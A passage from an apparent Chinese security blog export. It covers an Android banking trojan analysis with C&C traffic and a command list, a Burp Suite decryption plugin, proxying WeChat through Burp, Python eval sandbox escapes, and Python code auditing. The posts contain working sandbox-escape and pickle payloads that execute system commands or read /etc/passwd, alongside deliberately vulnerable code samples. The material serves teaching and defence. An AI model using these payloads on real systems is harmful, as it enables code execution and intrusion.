charset=UTF-8Host: 181.174.164.25:2080Connection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4) {“os”:”4.0.4”,”model”:”Unknown sdk”,”phone number”:”15555215554”,”apps”:[“com.android.gesture.builder”,”com.android.widgetpreview”,”com.example.android.apis”,”com.example.android.livecubes”,”com.example.android.softkeyboard”,”com.joeykrim.rootcheck”,”de.robv.android.xposed.installer”,”de.robv.android.xposed.installer.staticbusybox”,”eu.chainfire.supersu”,”org.slempo.service”],”imei”:”8f986e65d50f299a”,”client number”:”3”,”type”:”device info”,”operator”:”310260”,”country”:”US”}123456前面也说到了木马会根据当前正在运行的应用来决定是否启动伪信用卡页面，伪界面如下![添加信用卡][2]![添加详细信息][3]木马作者对上述用户信息做了严格校验，首先是信用卡信息必须合法，其次过期时间必须在2014到2020年之间，到了信用卡地址信息页面，对邮政编码和电话号码做了严格的关联，用户填完所有信息之后就会发送给c&amp;c主机，请求如下： POST / HTTP/1.1Content-Length: 401Content-Type: text/plain; charset=UTF-8Host: 181.174.164.25:2080Connection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4) {“data”:{“additional information”:{“old vbv password”:”123456”,”vbv password”:”qwerty”},”type”:”card information”,”card”:{“cvc”:”393”,”month”:”12”,”year”:”15”,”number”:”4024 0238 6573 0515”},”billing address”:{“date of birth”:”01.03.1990”,”phone number”:”212-925-2355”,”street address”:”dalianganjinzi”,”zip code”:”10002”,”phone prefix”:”+1”,”name on card”:”Zhanghua”}},”type”:”user data”,”code”:”-1”}1附录 c&amp;c指令 CommandCenter.commands. add(“#intercept_sms_start”);CommandCenter.commands .add (“#intercept_sms_stop”)CommandCenter.commands .add (“#block_numbers”);CommandCenter.commands .add (“#unblock_all_numbers”);CommandCenter.commands .add (“#unblock_numbers”);CommandCenter.commands .add (“#lock”);CommandCenter.commands .add (“#unlock”);CommandCenter.commands .add (“#send” + “_sms”);CommandCenter.commands .add (“#forward” + “_calls”);CommandCenter.commands .add (“#disable_forward_calls”);CommandCenter.commands .add (“#control_number”);CommandCenter.commands .add (“#update_html”);CommandCenter.commands .add (“#show_html”);CommandCenter.commands .add (“#wipe_data”);```]]></content>
      <categories>
        <category>木马</category>
      </categories>
      <tags>
        <tag>[object Object]</tag>
        <tag>木马浅析</tag>
        <tag>木马分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burpsuite 插件开发之RSA加解密]]></title>
    <url>%2F2016%2F02%2F01%2FBurpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8BRSA%E5%8A%A0%E8%A7%A3%E5%AF%86%2F</url>
    <content type="text"><![CDATA[burpsuit extention 插件 RSA encryption decryption #1，简介 burpsuit是一款非常好用的工具，目前我自己也是重度用户，所以就上手了burpsuit的插件接口开发，这篇文档主要记录了一个解密请求包，插入payload，再加密的插件开发过程。详细的代码见github代码，代码中除了burpsuit的接口实现，还包括各种加解密处理代码。在文档中数据首先是以rsa方式加密des的key得到encryptKey，然后使用des的key加密数据包得到data，再组装成一个JSON格式串，这是加密过程，当然解密过程就是逆向的。插件应用场景主要是用于通过分析apk的实现，或者泄露的密钥，获取其加解密算法，在解密后的数据包中插入payload，发现注入问题等。如下则是加密后的数据包： 1234c=&#123;&quot;data&quot;:&quot;21BhviedgtbwK6rdlK7vzltqxOLxUmU2g5qaO5LWPYTha5fXslmL6jrMkFnJBwpZPZMNl5foxTUHw2Mae++zkWwtzWkKXI9WJ/CJqxO9uORT5I6iUmIG7bBcgnHpmlSNKfFwBvnr9vj3v5ByvW2s2/pL9rSaeD+/8XsX01NA96mC4g5pVBeU5IY9F4tdxH9yobXfN6GzEVhLeiEd30xzMA\u003d\u003d&quot;,&quot;encryptKey&quot;:&quot;bjWZgigAW/ZaAA55v7Yi9AGt2qsP7BfZZISu70qc/xVUVfh5L/Mw/mMbzxkcZ6uXb1vvgXvF7hHYwjsVzvEkRK0rIfIwkcYzn160fvQ/8+F8YBMDLzTEhf8r0KjOLlJV+HgOsS4QG/G9lOU5mnupfrVA9sf54b3OvXHU0TQVG7U\u003d&quot;&#125; 从数据库包能看到大的数据是一个json格式，里面有data，和encryptKey值，encryptKey就是使用RSA加密des 的key得到的，RSA的工作方式和pem文件可通过界面设置，再接着用这个key采用des方式解密data中的内容。操作界面如下： #2，InsertPoint 接口 InsertPoint顾名思义就是注入点，就是payload插入的地方，比如request中的cookie，参数等位置。为了对一些burpsuit不支持的参数格式进行支持就必须实现该接口，可以用在Active Scanner和Intruder中. ##2.1 基础开发知识 最好的方式就是在原有插件的基础上修改，这样能省很多精力，当然如果要一步一步来的话，步骤如下：（1）包含burp的接口文件（2）创建一个包名为burp，在里面创建BurpExtender类，实现IBurpExtender接口，这个BurpExtender类是所有接口的心脏，注意这里涉及到名字都不能改动，burp插件就这么规定的。（3）实现唯一的接口函数123public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) &#123; this. callbacks = callbacks ; &#125; 通过callbacks获取核心基础库能力,像日志，请求，返回值修改等。（4）日志接口 123456789101112131415PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);//输出到插件的outputstdout.println(&quot;Hello output&quot;);// 输出到alerts tabcallbacks.issueAlert(&quot;Hello alerts&quot;);//打印调用栈e.printStackTrace(stderr)``` 有了这些日志接口就能比较好的调试代码了，如果要很好的跟踪请求的，可以在BApp Store中添加&quot;Custom Logger&quot;这个插件，能够记录所有的请求和返回信息。##2.2 getInsertionPoints下面我们就来讲讲如何实现一个`InsertionPoints`接口。第一步继承`IScannerInsertionPointProvider`接口，实现getInsertionPoints()方法，同时通过`callbacks.registerScannerInsertionPointProvider(this)`方法注册成为insertion point provider。下面我们就来看看`getInsertionPoints()`的实现。 @Override public List&lt;IScannerInsertionPoint&gt; getInsertionPoints(IHttpRequestResponse baseRequestResponse) { // 生成insertPoints数组 List&lt;IScannerInsertionPoint&gt; insertionPoints = new ArrayList&lt;IScannerInsertionPoint&gt;(); // 获取请求参数 IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse.getRequest()); List&lt;IParameter&gt; requestParams = requestInfo.getParameters(); for (IParameter parameter : requestParams) { String value = parameter.getValue(); value = helpers.urlDecode(value).trim(); EncryptBean encryptBean = new EncryptBean(); if (parameter.getName().trim().equals(&quot;c&quot;)){//参数中含有c参数表示要加密的内容 encryptBean = JSON.parseObject(value, EncryptBean.class); stdout.println(&quot;private key: &quot; + key.privateKey + &quot; public key &quot; + key.publicKey); try { value = decryptRSAAndDES(key, encryptBean); stdout.println(&quot;after decrypted:Will scan data at parameter &quot; + parameter + &quot; with value decrypted &quot; + value); } catch (Exception e) { e.printStackTrace(stderr); } if (value.isEmpty()) continue; try { String basename = parameter.getName(); //insertionPoints.add(new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)); JSONObject jsonObj = JSON.parseObject(value); String basevalue = &quot;&quot;; for(Map.Entry&lt;String, Object&gt; entry: jsonObj.entrySet()){ basename = entry.getKey(); basevalue = entry.getValue().toString(); //在这里传入总的value值以便在InsertionPoint进行分解，构造加密后的request请求，构造InsertionPoint时传入的value为总的value值 insertionPoints.add(0,new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)); stdout.println(&quot;in for:Will scan AES encrypted data at parameter &quot; + basename + &quot; with value &quot; + value); } } catch(Exception e) { } } } return insertionPoints; } 123这一段代码的大体意思就是通过helper.analyzeRequest方法获取所有请求信息，遍历其中的参数信息，当发现参数名等于&quot;c&quot;时就会调用解密过程，这块的代码需要根据参数格式自定义解析参数过程。调用解密的过程大体就是先解析JSON格式，然后解密，得到解密数据的内容后调用`new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)`实例化一个注入点。一般情况下basename和value是一一对应的，如param1=phoneNum，但是这里我们basename传入param1，value值则是解密后的值如`&#123;&quot;userid&quot;:&quot;51ba27cb-514d-3d86-0000-2f7515a40613&quot;,&quot;task_id&quot;:&quot;1450147269&quot;,&quot;param1&quot;:&quot;000000000000000&quot;,&quot;m&quot;:&quot;https&quot;&#125;`，这么传递是为了方便实例化插入点。接着我们看下InsertionPoint的参数构造。##2.3 InsertionPoint InsertionPoint(BurpExtender newParent, byte[] baseRequest, String basename, String basevalue) { this.parent = newParent; this.baseRequest = baseRequest; this.baseName = basename; //this.baseValue = basevalue; this.value = basevalue; this.baseValue = JSON.parseObject(basevalue).getString(basename); } 1在InsertionPoint的代码中有一个很重要的接口就是buildRequest，这个函数就是用来添加payload。 @Override public byte[] buildRequest(byte[] payload) { String payloadPlain = parent.helpers.bytesToString(payload); String payloadEncrypted = “”; String tmpAESKey = “0123456789abcdef”; parent.stdout.println(“payloadPlain:” + payloadPlain); parent.callbacks.issueAlert(“payloadPlain:” + payloadPlain); try { Map map = JSON.parseObject(this.value, new TypeReference]]></content>
      <categories>
        <category>Burp</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
        <tag>extention</tag>
        <tag>插件</tag>
        <tag>RSA</tag>
        <tag>加解密</tag>
        <tag>encryption</tag>
        <tag>decryption</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让Burpsuite监听微信公众号]]></title>
    <url>%2F2016%2F02%2F01%2F%E5%A6%82%E4%BD%95%E8%AE%A9Burpsuite%E7%9B%91%E5%90%AC%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[1 目的通过burpsuite代理截获微信公众号的https流量包，做一些重放和自动扫描。这个公众号会利用微信的认证体系，认证完之后就会到他本身的服务器，用户再通过微信内置浏览器的cookie或者其他认证机制交互，当然这些认证数据基本上无法获取，同时这个公众号在微信端也没有转发，在浏览器中打开等普通微信公众号常见功能。 2 模拟器+微信由于模拟器的便捷性，第一个就会被想到，于是在4.0.3的模拟器上装上了最新版的微信，运行就退出。既然最高版本都已经禁止了模拟器，就想着微信的历史版本，装了30，35，40，45，50等版本，都是运行一会就提示升级，并且是不让用，难道我要逆向微信的代码，这个代价有点大，搜搜才知道原来微信已经禁止在模拟器上使用了，后来看到了有人出了解决方案，就是先root，然后装xposed框架，然后在其上装XPrivacy，过程复杂，详情见链接，这种方法我没有接着试下去。 3 真机+微信模拟器已经被禁用，只能拿出自己的手机来试验了。 3.1 wifi 环境由于是台式机，直接使用的随身wifi，如果是笔记本，可以直接将本设置为wifi热点。 3.2 代理设置首先是burpsuite的代理设置，见下图，图中ip则是我的真实机的ip，绑定的端口则可以任意设置，不冲突即可，我这里设置成8080端口。![绑定ip]设置完burpsuite则是手机上wifi的代理设置，先连接到wifi热点，长按链接处，选“修改网络”，勾选“显示高级选项”，代理设置那里改成“手动”，就可以填写HTTP代理的主机和端口，在这里我们设置成第二步中burpsuite设置的ip地址和端口地址。 3.3 证书安装这样设置完之后基本上就可以抓包了，如果是https的请求，每次都会提示证书问题，很烦人也影响效率，所以我们要安装burpsuite的证书，由于前面设置好了代理，通过手机浏览器访问http://burp，就能看到有证书下载，下载完之后，通过手机的设置，安全，再到证书安装，安装完证书即可。 这样设置之后，手机上的大部分http和https数据包都能截获了，微信的数据包也能截获了，只是都是加密的，根本不知道是啥，要被测试的公众号呢？每次打开都是白屏，啥提示都没有，burpsuite上无流量显示，通过wireshark抓包，也仅仅是一些到腾讯服务器的tcp流量，难道微信还能自动检测代理存在，自动根据公众号的安全级别来绑定，安全级别高则不发送相应流量，仅仅是猜测。 上述方式行不通，想到了第三种 4 微信windows客户端微信在windows端也提供了相应的版本，相对于手机android版本，功能较弱，当然一些安全策略也有变化。（1）修改windows hosts的配置文件，路径(C:\Windows\System32\drivers\etc\hosts)，具体的配置如下：127.0.0.1 test.com （2）burpsuite代理的设置 按照如上图示设置之后，微信客户端发送到test.com的流量就直接转发给本地127.0.0.1:9080端口，这样burpsuite就能捕获到了，接着burpsuite将该包转发到test.com对应的ip的端口上就完成了一次请求捕获转发的过程。注意事项：support invible proxying 必须开启，否则看不到流量。request handling中redirect to host 必须设置成具体的ip,也就是test.com对应的ip，否则会导致包死循环在本地转发。 在burpsuite中如果设置成test.com会报如下错误1This request to Burp&apos;s web interface used a fully-qualified DNS name in the Host header. The request was blocked to prevent DNS rebinding attacks. You can enable support for fully-qualified DNS names in Burp&apos;s web interface at Proxy / Options / Miscellaneous. 接着按照如上设置之后，将如下选项打勾之后则会报后续错误，解决方法就是直接设置成ip和端口Invalid client request received: Dropped request looping back to same Proxy listener.在此我们就完成了微信流量的监测。 微信windows客户端的好处就是方便测试，另外能够打开在微信 android客户端无法获取链接的问题，目前在1.5.0.33好用，估计过段时间也会被微信封了。]]></content>
      <categories>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>Burpsuite</tag>
        <tag>微信公众号</tag>
        <tag>监听</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python eval的常见错误封装及利用原理]]></title>
    <url>%2F2015%2F07%2F31%2FPython%20eval%E7%9A%84%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E5%B0%81%E8%A3%85%E5%8F%8A%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。下面列举一个实际产品中的例子，详情见[bug83055][1]： def remove(request, obj)： query = query2dict(request.POST) eval(query[&apos;oper_type&apos;])(query, customer_obj) 而query就是POST直接转换而来，是用户可直接控制的，假如用户在url参数中输入oper_type=__import__(&#39;os&#39;).system(&#39;sleep 5&#39;) 则可以执行命令sleep，当然也可以执行任意系统命令或者任意可执行代码，危害是显而易见的，那我们来看看eval到底是做什么的，以及如何做才安全？ 1，做什么简单来说就是执行一段表达式 &gt;&gt;&gt; eval(&apos;2+2&apos;) 4 &gt;&gt;&gt; eval(&quot;&quot;&quot;{&apos;name&apos;:&apos;xiaoming&apos;,&apos;ip&apos;:&apos;10.10.10.10&apos;}&quot;&quot;&quot;) {&apos;ip&apos;: &apos;10.10.10.10&apos;, &apos;name&apos;: &apos;xiaoming&apos;} &gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {}) Linux 0 从这三段代码来看，第一个很明显做计算用，第二个把string类型数据转换成python的数据类型，这里是dict，这也是咱们产品中常犯的错误。第三个就是坏小子会这么干，执行系统命令。eval 可接受三个参数，eval(source[, globals[, locals]]) -&gt; valueglobals必须是路径，locals则必须是键值对，默认取系统globals和locals 2，不正确的封装（1）下面我们来看一段咱们某个产品代码中的封装函数，见[bug][2]，或者网络上搜索排名比较高的代码，eg： def safe_eval(eval_str): try: #加入命名空间 safe_dict = {} safe_dict[&apos;True&apos;] = True safe_dict[&apos;False&apos;] = False return eval(eval_str,{&apos;__builtins__&apos;:None},safe_dict) except Exception,e: traceback.print_exc() return &apos;&apos; 在这里__builtins__置为空了，所以像__import__这是内置变量就没有了，这个封装函数就安全了吗？下面我一步步道来： &gt;&gt;&gt; dir(__builtins__) [&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, 列表项 ‘UnicodeEncodeError’, ‘UnicodeError’, ‘UnicodeTranslateError’, ‘UnicodeWarning’, ‘UserWarning’, ‘ValueError’, ‘Warning’, ‘ZeroDivisionError’, ‘_’, ‘debug‘, ‘doc‘, ‘import‘, ‘name‘, ‘package‘, ‘abs’, ‘all’, ‘any’, ‘apply’, ‘basestring’, ‘bin’, ‘bool’, ‘buffer’, ‘bytearray’, ‘bytes’, ‘callable’, ‘chr’, ‘classmethod’, ‘cmp’, ‘coerce’, ‘compile’, ‘complex’, ‘copyright’, ‘credits’, ‘delattr’, ‘dict’, ‘dir’, ‘divmod’, ‘enumerate’, ‘eval’, ‘execfile’, ‘exit’, ‘file’, ‘filter’, ‘float’, ‘format’, ‘frozenset’, ‘getattr’, ‘globals’, ‘hasattr’, ‘hash’, ‘help’, ‘hex’, ‘id’, ‘input’, ‘int’, ‘intern’, ‘isinstance’, ‘issubclass’, ‘iter’, ‘len’, ‘license’, ‘list’, ‘locals’, ‘long’, ‘map’, ‘max’, ‘memoryview’, ‘min’, ‘next’, ‘object’, ‘oct’, ‘open’, ‘ord’, ‘pow’, ‘print’, ‘property’, ‘quit’, ‘range’, ‘raw_input’, ‘reduce’, ‘reload’, ‘repr’, ‘reversed’, ‘round’, ‘set’, ‘setattr’, ‘slice’, ‘sorted’, ‘staticmethod’, ‘str’, ‘sum’, ‘super’, ‘tuple’, ‘type’, ‘unichr’, ‘unicode’, ‘vars’, ‘xrange’, ‘zip’] 从__builtins__可以看到其模块中有__import__,可以借助用来执行os的一些操作。如果置为空，再去执行eval函数呢，结果如下： &gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {&apos;__builtins__&apos;:{}}) Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt; NameError: name &apos;__import__&apos; is not defined 现在就是提示__import__未定义，不能成功执行了，看情况是安全了吧？答案当然是错的。比如执行如下： &gt;&gt;&gt; s = &quot;&quot;&quot; ... (lambda fc=( ... lambda n: [ ... c for c in ... ().__class__.__bases__[0].__subclasses__() ... if c.__name__ == n ... ][0] ... ): ... fc(&quot;function&quot;)( ... fc(&quot;code&quot;)( ... 0,0,0,0,&quot;test&quot;,(),(),(),&quot;&quot;,&quot;&quot;,0,&quot;&quot; ... ),{} ... )() ... )() ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s, {&apos;__builtins__&apos;:{}}) Segmentation fault (core dumped) 在这里用户定义了一段函数，这个函数调用，直接导致段错误下面这段代码则是退出解释器： &gt;&gt;&gt; &gt;&gt;&gt; s = &quot;&quot;&quot; ... [ ... c for c in ... ().__class__.__bases__[0].__subclasses__() ... if c.__name__ == &quot;Quitter&quot; ... ][0](0)() ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s,{&apos;__builtins__&apos;:{}}) liaoxinxi@RCM-RSAS-V6-Dev ~/tools/auto_judge $ 初步理解一下整个过程： &gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__() [&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;Struct&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;] 这句python代码的意思就是找tuple的class，再找它的基类，也就是object，再通过object找他的子类，具体的子类也如代码中的输出一样。从中可以看到了有file模块，zipimporter模块，是不是可以利用下呢？首先从file入手假如用户如果构造： &gt;&gt;&gt; s1 = &quot;&quot;&quot; ... [ ... c for c in ... ().__class__.__bases__[0].__subclasses__() ... if c.__name__ == &quot;file&quot; ... ][0](&quot;/etc/passwd&quot;).read()() ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s1,{&apos;__builtins__&apos;:{}}) Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;&lt;string&gt;&quot;, line 6, in &lt;module&gt; IOError: file() constructor not accessible in restricted mode 这个restrictected mode简单理解就是python解释器的沙盒，一些功能被限制了，比如说不能修改系统，不能使用一些系统函数，如file，详情见Restricted Execution Mode，那怎么去绕过呢？这时我们就想到了zipimporter了，假如引入的模块中引用了os模块，我们就可以像如下代码来利用。 &gt;&gt;&gt; s2=&quot;&quot;&quot; ... [x for x in ().__class__.__bases__[0].__subclasses__() ... if x.__name__ == &quot;zipimporter&quot;][0]( ... &quot;/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg&quot;).load_module( ... &quot;configobj&quot;).os.system(&quot;uname&quot;) ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s2,{&apos;__builtins__&apos;:{}}) Linux 0 这就验证了刚才的safe_eval其实是不安全的。 3，如何正确使用（1）使用ast.literal_eval（2）如果仅仅是将字符转为dict，可以使用json格式]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>eval</tag>
        <tag>sandbox escape</tag>
        <tag>沙箱绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全编码和代码审计]]></title>
    <url>%2F2015%2F07%2F30%2FPython%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[1 前言现在一般的web开发框架安全已经做的挺好的了，比如大家常用的django，但是一些不规范的开发方式还是会导致一些常用的安全问题，下面就针对这些常用问题做一些总结。代码审计准备部分见《php代码审计》，这篇文档主要讲述各种常用错误场景，基本上都是咱们自己的开发人员犯的错误，敏感信息已经去除。 2 XSS未对输入和输出做过滤，场景：123def xss_test(request): name = request.GET['name'] return HttpResponse('hello %s' %(name)) 在代码中一搜，发现有大量地方使用，比较正确的使用方式如下：1234def xss_test(request): name = request.GET['name'] #return HttpResponse('hello %s' %(name)) return render_to_response('hello.html', &#123;'name':name&#125;) 更好的就是对输入做限制，比如说一个正则范围，输出使用正确的api或者做好过滤。 3 CSRF对系统中一些重要的操作要做CSRF防护，比如登录，关机，扫描等。django 提供CSRF中间件django.middleware.csrf.CsrfViewMiddleware,写入到settings.py的中间件即可。12345def my_view(request): c = &#123;&#125; c.update(csrf(request)) # ... view code here return render_to_response("a_template.html", c) 4 命令注入审计代码过程中发现了一些编写代码的不好的习惯，体现最严重的就是在命令注入方面，本来python自身的一些函数库就能完成的功能，偏偏要调用os.system来通过shell 命令执行来完成，老实说最烦这种写代码的啦。下面举个简单的例子：123456 def myserve(request, filename, dirname): re = serve(request=request,path=filename,document_root=dirname,show_indexes=True) filestr='authExport.dat' re['Content-Disposition'] = 'attachment; filename="' + urlquote(filestr) +'"'fullname=os.path.join(dirname,filename) os.system('sudo rm -f %s'%fullname) return re 很显然这段代码是存在问题的，因为fullname是用户可控的。正确的做法是不使用os.system接口，改成python自有的库函数，这样就能避免命令注入。python的三种删除文件方式：（1）shutil.rmtree 删除一个文件夹及所有文件（2）os.rmdir 删除一个空目录（3）os.remove，unlink 删除一个文件 使用了上述接口之后还得注意不能穿越目录，不然整个系统都有可能被删除了。常见的存在命令执行风险的函数如下：1os.system,os.popen,os.spaw*,os.exec*,os.open,os.popen*,commands.call,commands.getoutput,Popen* 推荐使用subprocess模块，同时确保shell=True未设置，否则也是存在注入风险的。 5 sql注入如果是使用django的api去操作数据库就应该不会有sql注入了，但是因为一些其他原因使用了拼接sql，就会有sql注入风险。下面贴一个有注入风险的例子：123456789101112131415161718192021222324252627282930313233343536373839404142def getUsers(user_id=None): conn = psycopg2.connect("dbname='××' user='××' host='' password=''") cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor) if user_id==None: str = 'select distinct * from auth_user' else: str='select distinct * from auth_user where id=%s'%user_id res = cur.execute(str) res = cur.fetchall() conn.close() return res``` 像这种sql拼接就有sql注入问题，正常情况下应该使用django的数据库api，如果实在有这方面的需求，可以按照如下方式写： ```pythondef user_contacts(request): user = request.GET['username'] sql = "SELECT * FROM user_contacts WHERE username = %s" cursor = connection.cursor() cursor.execute(sql, [user])# do something with the results results = cursor.fetchone() #or results = cursor.fetchall() cursor.close()``` 直接拼接的是万万不可的，如果采用ModelInstance.objects.raw(sql,[]),或者connection.objects.execute(sql,[]) ,通过列表传进去的参数是没有注入风险的，因为django会有处理。# 6 代码执行 一般是由于eval和pickle.loads的滥用造成的，特别是eval，大家都没有意识到这方面的问题。下面举个代码中的例子：```python@login_required@permission_required("accounts.newTask_assess")def targetLogin(request): req = simplejson.loads(request.POST['loginarray']) req=unicode(req).encode("utf-8") loginarray=eval(req) ip=_e(request,'ipList') #targets=base64.b64decode(targets) (iplist1,iplist2)=getIPTwoList(ip) iplist1=list(set(iplist1)) iplist2=list(set(iplist2)) loginlist=[] delobjs=[] holdobjs=[] 这一段代码就是就是因为eval的参数不可控，导致任意代码执行，正确的做法就是literal.eval接口。再取个pickle.loads的例子：1234&gt;&gt;&gt; import cPickle&gt;&gt;&gt; cPickle.loads("cos\nsystem\n(S'uname -a'\ntR.")Linux RCM-RSAS-V6-Dev 3.9.0-aurora #4 SMP PREEMPT Fri Jun 7 14:50:52 CST 2013 i686 Intel(R) Core(TM) i7-2600 CPU @ 3.40GHz GenuineIntel GNU/Linux0 7 文件操作文件操作主要包含任意文件下载，删除，写入，覆盖等，如果能达到写入的目的时基本上就能写一个webshell了。下面举个任意文件下载的例子：123456789@login_required@permission_required("accounts.newTask_assess")def exportLoginCheck(request,filename): if re.match(r“*.lic”，filename): fullname = filename else: fullname = "/tmp/test.lic" print fullname return HttpResponse(fullname) 这段代码就存在着任意.lic文件下载的问题，没有做好限制目录穿越，同理 8 文件上传8.1 任意文件上传这里主要是未限制文件大小，可能导致ddos，未限制文件后缀，导致任意文件上传，未给文件重命名，可能导致目录穿越，文件覆盖等问题。 8.2 